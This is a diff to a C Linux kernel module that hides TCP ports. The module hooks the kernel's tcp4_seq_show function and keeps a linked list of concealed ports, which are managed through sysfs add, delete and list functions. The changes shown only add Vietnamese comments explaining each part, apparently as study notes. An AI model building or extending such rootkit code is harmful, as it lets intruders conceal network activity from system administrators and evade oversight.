@@ -17,7 +17,7 @@
 #define LOG_PREFIX "hide: "
 #define SYS_DIR_NAME "hide"
 
-struct port_info {
+struct port_info {// struct luu thong tin cua port theo kieu stack
     int port;
     struct port_info *next;
 };
@@ -28,6 +28,7 @@ static struct port_info *port_info_list_head;
 static struct port_info *port_info_list_tail;
 
 /* implement for tcp4 and tcp6 */
+// ẩn cổng TCP trong hệ thống
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 
 static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
@@ -74,6 +75,7 @@ struct port_info *get_port_info_list_head(void){
     return port_info_list_head;
 }
 
+// them port khoi danh sach port duoc an
 int port_add(int port) {
     struct port_info *port_info_list_node,*tmp;
     /* check if the port is already hidden */
@@ -96,6 +98,7 @@ int port_add(int port) {
     return 0;
 }
 
+// xoa port khoi danh sach an
 int port_del(int port) {
     struct port_info *node,*tmp;
     node = port_info_list_head;
@@ -116,7 +119,7 @@ int port_del(int port) {
     pr_info(LOG_PREFIX "port %d is unhidden!\n",port);
     return 0;
 }
-
+//  cac ham de lam viec voi kernel sysfs : list, add, del
 static ssize_t port_kobj_list(struct kobject *kobj,
                                    struct kobj_attribute *attr, char *buf) {
     size_t remain_size = PAGE_SIZE;
